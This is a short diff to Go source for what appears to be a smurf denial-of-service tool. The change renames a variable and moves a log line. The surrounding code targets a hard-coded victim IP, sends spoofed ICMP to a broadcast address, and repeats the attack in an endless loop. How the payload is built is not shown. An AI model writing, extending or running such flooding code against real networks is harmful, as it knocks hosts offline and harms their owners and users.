@@ -9,16 +9,16 @@ import (
 
 func main() {
 	victim := net.IP{192, 168, 1, 73}
-	router := net.IP{192, 168, 1, 255}
+	network := net.IP{192, 168, 1, 255}
 
-	s, err := newSmurf(victim, router)
+	s, err := newSmurf(victim, network)
 	if err != nil {
 		log.Fatal(err)
 	}
 
+	log.Printf("[smurf] victim: %s, sending icmp to (%s)", victim.String(), network.String())
 	log.Printf("[smurf] spoofed payload:\n%v", hex.Dump(s.payload))
 	for {
-		log.Printf("[smurf] victim (%s), with router (%s)", victim.String(), router.String())
 		if err := s.execute(); err != nil {
 			log.Printf("[smurf] error: %s", err)
 		}
